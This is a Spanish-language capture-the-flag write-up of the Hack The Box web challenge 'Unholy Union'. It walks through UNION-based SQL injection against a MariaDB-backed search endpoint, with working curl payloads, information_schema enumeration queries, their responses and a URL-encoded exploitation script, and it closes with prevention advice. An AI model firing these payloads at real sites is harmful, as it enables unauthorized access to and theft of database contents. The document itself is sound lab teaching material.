---
title: "Unholy Union"
description: "Writeup de Unholy Union - Hack The Box - Web 100pts. UNION-based SQL injection en /search?query= con 5 columnas sobre MariaDB 10.11.8; enumeración de information_schema revela tabla 'flag' con columna 'flag'; extracción directa con SELECT flag FROM flag."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - sqli
  - sql-injection
  - union
  - mariadb
  - information-schema
  - enumeration
---

# Unholy Union

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

**Unholy Union** es un inventario de Halloween (Node.js/Express) con una funcionalidad de búsqueda en `/search?query=` directamente vulnerable a UNION-based SQL injection. El backend usa **MariaDB 10.11.8**. No hay WAF ni filtros visibles: el input del query llega directo a la query SQL. Con inyección UNION podemos consultar `information_schema` para enumerar tablas y columnas, y luego extraer la flag de la tabla correspondiente.

---

## Reconocimiento

```bash
whatweb http://$HOST/
# [200 OK] Express, Title[Haunted Inventory Manager - Halloween Edition]

# Una búsqueda normal:
curl -s "http://$HOST/search?query=pumpkin"
# {"status":"success","message":[...]}
```

La respuesta devuelve JSON con 5 campos visibles: `id`, `name`, `description`, `origin`, `created_at`. Esto sugiere que la query SQL selecciona 5 columnas.

---

## Confirmación de SQLi

Inyectar comilla simple para romper la query:

```bash
curl -s "http://$HOST/search?query='"
# Error SQL o respuesta vacía → SQLi confirmado
```

Para determinar el número de columnas, probamos con UNION NULL:

```bash
# 5 columnas → UNION SELECT con 5 valores funciona
curl -s "http://$HOST/search?query=' AND 1=0 UNION SELECT 1,2,3,4,5-- -"
# {"status":"success","message":[{"id":"1","name":"2","description":"3","origin":"4","created_at":"5"}]}
```

Confirmados: 5 columnas, todas visibles en la respuesta JSON.

---

## Enumeración con information_schema

**Paso 1: Listar tablas de la base de datos actual**

```bash
P1="' AND 1=0 UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -"
curl -s "http://$HOST/search?query=$P1"
```

```json
{"status":"success","message":[
  {"id":"flag","name":"2","description":"3","origin":"4","created_at":"5"},
  {"id":"inventory","name":"2","description":"3","origin":"4","created_at":"5"}
]}
```

Hay dos tablas: `flag` e `inventory`. La tabla `flag` es nuestro objetivo.

**Paso 2: Listar columnas de las tablas**

```bash
P2="' AND 1=0 UNION SELECT CONCAT(table_name,0x3a,column_name),2,3,4,5 FROM information_schema.columns WHERE table_schema=database()-- -"
curl -s "http://$HOST/search?query=$P2"
```

```json
{"status":"success","message":[
  {"id":"flag:flag","name":"2","description":"3","origin":"4","created_at":"5"},
  {"id":"inventory:id","name":"2","description":"3","origin":"4","created_at":"5"},
  {"id":"inventory:name","name":"2","description":"3","origin":"4","created_at":"5"},
  ...
]}
```

La tabla `flag` tiene una sola columna: `flag`.

---

## Verificación del backend (opcional)

```bash
P4="' AND 1=0 UNION SELECT version(),2,3,4,5 FROM information_schema.tables LIMIT 1-- -"
curl -s "http://$HOST/search?query=$P4"
# {"id":"10.11.8-MariaDB",...}
```

Confirmado: **MariaDB 10.11.8**.

---

## Extracción de la flag

```bash
P3="' AND 1=0 UNION SELECT flag,2,3,4,5 FROM flag-- -"
curl -s "http://$HOST/search?query=$P3"
```

```json
{"status":"success","message":[
  {"id":"HTB{FLAG}","name":"2","description":"3","origin":"4","created_at":"5"}
]}
```

La flag aparece en el campo `id` de la respuesta JSON.

---

## Script completo de explotación

```bash
BASE="http://$HOST/search?query="

# 1. Tablas
curl -s "$BASE%27%20AND%201%3D0%20UNION%20SELECT%20table_name%2C2%2C3%2C4%2C5%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()--+-"

# 2. Columnas
curl -s "$BASE%27%20AND%201%3D0%20UNION%20SELECT%20CONCAT(table_name%2C0x3a%2Ccolumn_name)%2C2%2C3%2C4%2C5%20FROM%20information_schema.columns%20WHERE%20table_schema%3Ddatabase()--+-"

# 3. Flag
curl -s "$BASE%27%20AND%201%3D0%20UNION%20SELECT%20flag%2C2%2C3%2C4%2C5%20FROM%20flag--+-"
```

---

## Cadena de Ataque

```text
1. GET /search?query=test → JSON con 5 campos → 5 columnas en la query
       ↓
2. UNION SELECT 1,2,3,4,5 → todos visibles → confirmamos posiciones
       ↓
3. UNION SELECT table_name FROM information_schema.tables → tablas: flag, inventory
       ↓
4. UNION SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns → flag:flag
       ↓
5. UNION SELECT flag,2,3,4,5 FROM flag → HTB{FLAG}
```

---

## Lecciones Aprendidas

- **UNION-based SQLi requiere conocer el número de columnas**: el primer paso siempre es determinar cuántas columnas devuelve la query original (UNION SELECT NULL,NULL,...).
- **information_schema como mapa de la base de datos**: `information_schema.tables` y `information_schema.columns` permiten enumerar toda la estructura sin conocer nada a priori. Es la técnica estándar de enumeración en SQLi sin error-based ni blind.
- **CONCAT con 0x3a**: `CONCAT(col1, 0x3a, col2)` usa el valor hex de `:` para concatenar columnas en un solo campo — útil cuando solo se puede extraer un valor por fila.
- **Prevención**: queries parametrizadas o prepared statements en el ORM. En Express/Node.js: usar `?` en la query con mysql2 en lugar de interpolación de strings.

---

## Referencias

- [PortSwigger — UNION-based SQL injection](https://portswigger.net/web-security/sql-injection/union-attacks)
- [HackTricks — SQLi Union](https://book.hacktricks.xyz/pentesting-web/sql-injection#union-based-exploitation)
- [MariaDB — information_schema](https://mariadb.com/kb/en/information-schema-tables-table/)
